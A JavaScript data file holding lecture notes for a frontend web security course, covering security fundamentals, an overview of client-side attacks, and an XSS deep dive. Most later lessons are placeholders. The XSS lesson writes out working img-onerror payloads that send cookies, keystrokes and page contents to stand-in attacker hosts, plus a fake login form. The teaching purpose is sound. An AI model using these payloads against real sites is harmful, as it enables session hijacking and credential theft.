const lectureNotesData = [
  {
    sectionId: "security",
    sectionTitle: "01 - Security",
    items: [
      {
        id: "01-01-web-security-introduction-fundamentals",
        title: "1.1 Web Security � Introduction & Fundamentals",
        summary: "Foundational frontend security principles, myths, and real-world examples.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "Web Security � Introduction & Fundamentals",
            subTitle: "Core principles for frontend security",
            description: "# Web Security � Introduction & Fundamentals\n\n### 1. The Core Philosophy: Balancing UX & Security\n\n- **Critical Component:** Security is a non-negotiable aspect of software engineering, imperative for junior, senior, and lead developers alike.\n- **The UX Challenge:** Implementing robust security mechanisms must not degrade the User Experience (UX). High-level engineering requires creating a frictionless yet highly secure user journey.\n\n### 2. The Frontend Security Myth\n\n- **The Misconception:** A common industry myth among frontend engineers is that \"Security is solely a backend responsibility.\"\n- **The Reality:** The vast majority of cyber attacks originate or are initiated directly via the client-side (frontend). Because backend APIs implicitly trust the incoming requests from authenticated client applications, any compromise on the frontend can severely jeopardize the entire ecosystem.\n- **The Zero-Trust Model:** Never implicitly trust any user, even if they are authenticated, active session holders, or premium paid customers. Every client interaction should be treated with a defensive, security-first lens.\n\n### 3. Key Pillars of the Frontend Security Roadmap\nTo design architecture that safeguards client-side components, a frontend engineer must master the following core concepts:\n\n- **Network Security (HTTPS):** Ensuring all data in transit is encrypted over secure cryptographic protocols to mitigate network sniffing and man-in-the-middle (MITM) attacks.\n- **Input & Output Sanitization:** Strictly validating and escaping user inputs before parsing them into the document object model (DOM). Modern UI frameworks (like React) inherently handle text escaping, but vulnerabilities arise when raw execution entry points (e.g., `dangerouslySetInnerHTML`) are leveraged carelessly.\n- **Authentication vs. Authorization:** Distinctly managing who the user is (Authentication) and what exact permissions or resource scopes they hold (Authorization).\n- **Dependency Vetting:** Scrutinizing all third-party packages to ensure they do not introduce vulnerabilities or malicious payloads.\n\n### 4. Real-World Examples\n\n**Case Study: E-commerce Password Reset**\nA common oversight occurs when developers store sensitive user data (like reset tokens) in plain-text localStorage. An XSS vector then exfiltrates this token to an attacker, granting full account takeover capability.\n\n**Lesson:** Always hash, encrypt, and store sensitive tokens securely on the backend, never on the client-side in an unencrypted state."
          }
        ]
      },
      {
        id: "01-02-security-overview",
        title: "1.2 Security Overview",
        summary: "Lecture on the security section introduction.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.2 Security Overview",
            subTitle: "Section introduction",
            description: "### 1. Core Client-Side Vulnerabilities & Attacks\n\n- **XSS (Cross-Site Scripting):** A severe vulnerability where malicious scripts are injected into trusted websites via untrusted user inputs or manipulated URL query parameters. These scripts execute within the victim's browser session, leading to data exfiltration.\n- **CSRF (Cross-Site Request Forgery):** An attack vector that forces an authenticated user to execute unwanted actions on a web application in which they are currently logged in, bypassing state-changing request security.\n- **SSRF (Server-Side Request Forgery):** Though primarily a backend threat, frontend architectures can accidentally trigger SSRF by exposing internal endpoints or failing to validate URLs passing through client-side components to backend relays.\n\n### 2. Access Governance & Network Communication\n\n- **Authentication & Authorization Failures:** Vulnerabilities arising from broken access controls. Without strict frontend role-guards and backend synchronization, unauthorized users can escalate privileges, gaining administrative access to restricted panels or routes.\n- **HTTPS over HTTP:** Standardizing absolute encryption in transit. Utilizing secure cryptographic protocols prevents data sniffing, session hijacking, and man-in-the-middle attacks across networks.\n- **Security Headers:** Leveraging explicit HTTP response headers (e.g., Content Security Policy, X-Frame-Options) to enforce runtime rules, restrict domain execution boundaries, and block bad-intention behaviors.\n- **CORS (Cross-Origin Resource Sharing):** A browser-level security mechanism that restricts web applications from making requests to a domain different from the one that served the application, protecting private API endpoints from unauthorized cross-domain scripting.\n\n### 3. Component & Local Storage Safety\n\n- **Iframe Misuse & Clickjacking:** Attacks where a malicious site embeds your genuine application inside an invisible or disguised layer, tricking users into clicking buttons or links they cannot see.\n- **Local Storage Exposure:** Storing sensitive information (like API keys, auth tokens, or PII) in browser local storage exposes data to XSS attacks and potential theft.\n- **Session Management:** Properly implementing session timeouts, token rotation, and secure cookie flags (HttpOnly, Secure, SameSite).\n\n### 4. Compliance & Regulatory Standards\n\n- **GDPR Compliance:** European data protection regulation requiring explicit consent, data minimization, and right to erasure.\n- **HIPAA (Healthcare):** Protections for protected health information with strict encryption and access control requirements.\n- **PCI DSS (Payment Card Industry):** Standards for organizations handling credit card data."
          }
        ]
      },
      {
        id: "01-03-cross-site-scripting-xss",
        title: "1.3 Cross-site Scripting (XSS)",
        summary: "Examines XSS attack methods, real-world risks, and concrete defenses for web apps.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "Architectural Definition of XSS",
            subTitle: "Critical client-side vulnerability with injection methods",
            description: "# Module 3: Frontend Web Security — XSS Deep Dive & Attack Vectors\n\n### 1. Architectural Definition of XSS\n* **Cross-Site Scripting (XSS):** A critical client-side vulnerability where an external attacker successfully injects malicious JavaScript execution sequences into a trusted web application.\n* **The Vulnerability Core:** This occurs when an application reads unvalidated data from an untrusted user input or URL query parameter and directly renders it into the Document Object Model (DOM) via unescaped APIs like innerHTML.\n* **Impact Matrix:** Unauthorized extraction of session cookies, sensitive personal data theft, UI manipulation, hijacking account credentials, and unauthorized state mutation.\n\n---\n\n### 2. The 5 Vector Archetypes (Technical Breakdowns)\n\n#### A. User Session Hijacking (Cookie Exfiltration)\n* **Mechanics:** Attackers leverage unvalidated injection points to execute malicious runtime code designed to capture session metadata.\n* **The Bypass Vector:** Because modern browsers proactively flag and strip down raw script tags passed directly in queries, attackers utilize alternative HTML element lifecycle hooks like the onerror event handler of an image tag.\n* **Payload Code:**\n```html\n<img src=\"invalid_source.jpg\" onerror=\"const img = new Image(); img.src = 'http://attacker-malicious-server:50001/log?cookie=' + encodeURIComponent(document.cookie);\" />\n```\n* **Execution Flow:** When the browser attempts to load the non-existent image source, the onerror fallback immediately triggers the JavaScript payload, reading document.cookie and dispatching it to the attacker's server.\n\n#### B. Unauthorized State Mutation (On Behalf of User)\n* **Mechanics:** Attackers inspect client-side bundles to identify global utility functions or API handling triggers exposed in the window or global scope (e.g., createPost(title, desc)).\n* **Payload Code:**\n```html\n<img src=\"invalid_source.jpg\" onerror=\"window.createPost('Hacked Title', 'Malicious Post Content');\" />\n```\n* **Execution Flow:** Once the script runs, it programmatically calls the application's internal functions using the user's active context. Since the request originates natively from the victim's browser, it inherently attaches all valid authorization tokens, credentials, and session state details—silently forcing the user to perform unintended operations.\n\n#### C. Keystroke Capturing (Client-Side Keylogging)\n* **Mechanics:** Attackers inject persistent global event listeners directly into the active browser DOM to spy on real-time user inputs.\n* **Payload Code:**\n```html\n<img src=\"invalid_source.jpg\" onerror=\"window.addEventListener('keypress', (e) => { fetch('http://attacker-server.com/capture', { method: 'POST', body: JSON.stringify({ key: e.key }) }); });\" />\n```\n* **Execution Flow:** As the victim navigates the infected layout or types into input components, every discrete keypress is monitored, buffered, and streamed silently to a malicious third-party server, compromising personal credentials as they are typed.\n\n#### D. DOM Dumping & Data Exfiltration\n* **Mechanics:** Instead of targeting protected backend databases, attackers grab sensitive data that has already been successfully fetched and rendered in plain text on the user's viewport.\n* **Payload Code:**\n```html\n<img src=\"invalid_source.jpg\" onerror=\"fetch('http://attacker-server.com/dom-dump', { method: 'POST', body: document.body.innerHTML });\" />\n```\n* **Execution Flow:** The script extracts the entire layout's inner HTML—which could expose structural bank statements, user data, or private dashboards—and beams the complete rendered data layout directly to the attacker.\n\n#### E. Client-Side UI Phishing\n* **Mechanics:** Attackers inject entire structures of malicious HTML elements directly into text injection regions to fully overwrite or append misleading forms onto the genuine webpage.\n* **Payload Code:**\n```html\n<form action=\"http://attacker-server.com/fake-login.php\" method=\"POST\"><input type=\"text\" name=\"username\" placeholder=\"Enter Username\" /><input type=\"password\" name=\"password\" placeholder=\"Enter Password\" /><button type=\"submit\">Log On</button></form>\n```\n* **Execution Flow:** The layout renders a fake authentication overlay inside a trusted domain (like an e-commerce checkout page). When the user types their credentials and submits, the form bypasses the application's official authentication routing, sending the raw data straight to the hacker's portal.\n\n---\n\n### 3. Engineering Best Practices & Mitigation Strategy\n> **The Security Golden Rule:** Cross-Site Scripting underscores why frontend applications must never assume client-side isolation is a substitute for absolute data sanitization.\n> \n> **Core Action Item:** All dynamic queries, input bindings, and contextual URLs must undergo strict escaping protocols before interacting with the DOM tree to prevent devastating client-side security failures."
          }
        ]
      },
      {
        id: "01-04-iframe-protection",
        title: "1.4 iFrame Protection",
        summary: "Preventing iFrame-based attacks.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.4 iFrame Protection",
            subTitle: "iFrame security",
            description: "Content placeholder for 1.4 iFrame protection."
          }
        ]
      },
      {
        id: "01-05-security-headers",
        title: "1.5 Security Headers",
        summary: "Using HTTP security headers.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.5 Security Headers",
            subTitle: "Headers and policies",
            description: "Content placeholder for 1.5 security headers."
          }
        ]
      },
      {
        id: "01-06-client-side-security",
        title: "1.6 Client-side Security",
        summary: "Frontend and browser security patterns.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.6 Client-side Security",
            subTitle: "Browser-side defenses",
            description: "Content placeholder for 1.6 client-side security."
          }
        ]
      },
      {
        id: "01-07-secure-communication-https",
        title: "1.7 Secure Communication (HTTPS)",
        summary: "Understanding HTTPS and encryption.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.7 Secure Communication (HTTPS)",
            subTitle: "Encryption fundamentals",
            description: "Content placeholder for 1.7 secure communication."
          }
        ]
      },
      {
        id: "01-08-dependency-security",
        title: "1.8 Dependency Security",
        summary: "Securing npm packages and dependencies.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.8 Dependency Security",
            subTitle: "Supply chain protection",
            description: "Content placeholder for 1.8 dependency security."
          }
        ]
      },
      {
        id: "01-09-compliance-regulation",
        title: "1.9 Compliance & Regulation",
        summary: "Security compliance basics.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.9 Compliance & Regulation",
            subTitle: "Policy and standards",
            description: "Content placeholder for 1.9 compliance and regulation."
          }
        ]
      },
      {
        id: "01-10-input-validation-and-sanitization",
        title: "1.10 Input Validation and Sanitization",
        summary: "Validating and sanitizing user input.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.10 Input Validation and Sanitization",
            subTitle: "Secure input handling",
            description: "Content placeholder for 1.10 input validation and sanitization."
          }
        ]
      },
      {
        id: "01-11-ssrf",
        title: "1.11 Server-side Request Forgery (SSRF)",
        summary: "Preventing SSRF attacks.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.11 Server-side Request Forgery (SSRF)",
            subTitle: "SSRF defense",
            description: "Content placeholder for 1.11 SSRF."
          }
        ]
      },
      {
        id: "01-12-server-side-javascript-injection",
        title: "1.12 Server-side JavaScript Injection",
        summary: "Protecting backend code execution.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.12 Server-side JavaScript Injection",
            subTitle: "Backend injection protection",
            description: "Content placeholder for 1.12 server-side JavaScript injection."
          }
        ]
      },
      {
        id: "01-13-feature-policy-permissions-policy",
        title: "1.13 Feature Policy / Permissions-Policy",
        summary: "Browser feature restrictions.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.13 Feature Policy / Permissions-Policy",
            subTitle: "Browser feature control",
            description: "Content placeholder for 1.13 feature policy and permissions-policy."
          }
        ]
      },
      {
        id: "01-14-subresource-integrity-sri",
        title: "1.14 Subresource Integrity (SRI)",
        summary: "Ensuring third-party script integrity.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.14 Subresource Integrity (SRI)",
            subTitle: "Third-party script verification",
            description: "Content placeholder for 1.14 subresource integrity."
          }
        ]
      }
    ]
  }
];

export default lectureNotesData;
